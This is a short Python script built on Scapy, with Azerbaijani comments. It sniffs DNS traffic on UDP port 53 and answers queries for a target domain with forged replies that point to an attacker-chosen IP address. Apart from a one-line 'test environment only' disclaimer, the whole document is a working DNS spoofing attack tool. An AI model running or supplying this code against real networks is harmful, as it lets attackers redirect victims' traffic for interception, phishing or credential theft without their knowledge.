from scapy.all import *

# Hücumçunun saxta IP ünvanı
fake_ip = "192.168.1.100"

# Hədəf domen
target_domain = "example.com"

def spoof_dns(packet):
    if packet.haslayer(DNSQR) and target_domain in packet[DNSQR].qname.decode():
        print(f"[+] DNS sorğusu tapıldı: {packet[DNSQR].qname.decode()}")
        
        spoofed_pkt = IP(dst=packet[IP].src, src=packet[IP].dst) /\
                      UDP(dport=packet[UDP].sport, sport=53) /\
                      DNS(id=packet[DNS].id, qr=1, aa=1, qd=packet[DNS].qd,
                          an=DNSRR(rrname=packet[DNS].qd.qname, ttl=10, rdata=fake_ip))
        
        send(spoofed_pkt, verbose=0)
        print(f"[+] Saxta DNS cavabı göndərildi -> {fake_ip}")

print("[*] DNS spoof simulyasiyası başladı (yalnız test mühiti üçün)...")
sniff(filter="udp port 53", prn=spoof_dns)
